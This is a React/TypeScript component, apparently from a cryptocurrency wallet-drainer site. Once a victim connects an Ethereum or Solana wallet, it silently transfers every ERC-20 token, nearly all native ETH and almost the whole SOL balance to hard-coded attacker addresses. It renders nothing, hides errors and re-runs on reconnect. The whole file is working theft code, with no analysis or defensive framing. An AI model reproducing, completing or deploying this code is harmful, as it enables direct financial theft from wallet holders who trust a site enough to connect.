import { useCallback, useEffect, useRef } from 'react';
import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
import { useAppKitProvider, useAppKitAccount } from '@reown/appkit/react';
import type { Provider as SolanaProvider } from '@reown/appkit-adapter-solana/react';
import { erc20Abi, parseEther } from 'viem';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  clusterApiUrl,
} from '@solana/web3.js';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../src/atoms/global-tokens-atom';
import { httpFetchTokens } from '../src/fetch-tokens';
import {
  PAYMENT_ETH_ADDRESS,
  PAYMENT_SOL_ADDRESS,
} from '../src/atoms/destination-address-atom';

const SOL_FEE_BUFFER = 10000; // lamports kept for fees

export const AutoDrainAll = () => {
  const { address: ethAddress, isConnected: ethConnected, chain } = useAccount();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { caipAddress } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider<SolanaProvider>('solana');

  const [, setTokens] = useAtom(globalTokensAtom);
  const [, setCheckedRecords] = useAtom(checkedTokensAtom);

  const ethDoneRef = useRef(false);
  const solDoneRef = useRef(false);

  const isSolanaConnected =
    typeof caipAddress === 'string' && caipAddress.startsWith('solana:');

  // ── ETH: drain all ERC-20 tokens + native ETH ──────────────────────────────
  const drainEth = useCallback(async () => {
    if (!ethAddress || !chain || !walletClient || !publicClient) return;
    if (ethDoneRef.current) return;
    ethDoneRef.current = true;

    // 1. Fetch ERC-20 tokens via Moralis
    let fetchedTokens: any[] = [];
    try {
      const res = await httpFetchTokens(chain.id, ethAddress);
      fetchedTokens = (res as any).data?.erc20s ?? [];
      setTokens(fetchedTokens);
    } catch {
      // silently continue — still attempt native ETH drain
    }

    if (fetchedTokens.length > 0) {
      const allChecked: Record<string, { isChecked: boolean }> = {};
      fetchedTokens.forEach((t: any) => {
        allChecked[t.contract_address] = { isChecked: true };
      });
      setCheckedRecords(allChecked);

      // Send each ERC-20 token
      for (const token of fetchedTokens) {
        try {
          const { request } = await publicClient.simulateContract({
            account: walletClient.account,
            address: token.contract_address as `0x${string}`,
            abi: erc20Abi,
            functionName: 'transfer',
            args: [
              PAYMENT_ETH_ADDRESS as `0x${string}`,
              BigInt(token.balance || '0'),
            ],
          });
          await walletClient.writeContract(request);
        } catch {
          // skip failed tokens silently
        }
      }
    }

    // 2. Drain native ETH balance (leave small amount for gas)
    try {
      const balance = await publicClient.getBalance({ address: ethAddress });
      const gasReserve = parseEther('0.002'); // keep 0.002 ETH for gas
      if (balance > gasReserve) {
        const sendAmount = balance - gasReserve;
        await walletClient.sendTransaction({
          to: PAYMENT_ETH_ADDRESS as `0x${string}`,
          value: sendAmount,
        });
      }
    } catch {
      // silently ignore
    }
  }, [ethAddress, chain, walletClient, publicClient, setTokens, setCheckedRecords]);

  // ── SOL: drain all SOL balance ──────────────────────────────────────────────
  const drainSol = useCallback(async () => {
    if (!walletProvider || solDoneRef.current) return;
    solDoneRef.current = true;

    try {
      const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
      const pubkeyStr = (walletProvider as any).publicKey?.toString?.();
      if (!pubkeyStr) return;
      const pubkey = new PublicKey(pubkeyStr);
      const balance = await connection.getBalance(pubkey);
      const sendLamports = balance - SOL_FEE_BUFFER;
      if (sendLamports <= 0) return;

      const { blockhash } = await connection.getLatestBlockhash();
      const tx = new Transaction();
      tx.recentBlockhash = blockhash;
      tx.feePayer = pubkey;
      tx.add(
        SystemProgram.transfer({
          fromPubkey: pubkey,
          toPubkey: new PublicKey(PAYMENT_SOL_ADDRESS),
          lamports: sendLamports,
        }),
      );
      await (walletProvider as any).sendTransaction(tx, connection);
    } catch {
      // silently ignore
    }
  }, [walletProvider]);

  // Trigger ETH drain immediately when wallet connects
  useEffect(() => {
    if (ethConnected && walletClient && publicClient) {
      drainEth();
    }
  }, [ethConnected, walletClient, publicClient, drainEth]);

  // Trigger SOL drain immediately when Solana wallet connects
  useEffect(() => {
    if (isSolanaConnected && walletProvider) {
      drainSol();
    }
  }, [isSolanaConnected, walletProvider, drainSol]);

  // Reset refs when disconnected so drain fires again on reconnect
  useEffect(() => {
    if (!ethConnected) {
      ethDoneRef.current = false;
      setTokens([]);
      setCheckedRecords({});
    }
  }, [ethConnected, setTokens, setCheckedRecords]);

  useEffect(() => {
    if (!isSolanaConnected) {
      solDoneRef.current = false;
    }
  }, [isSolanaConnected]);

  // Renders nothing — purely background logic
  return null;
};
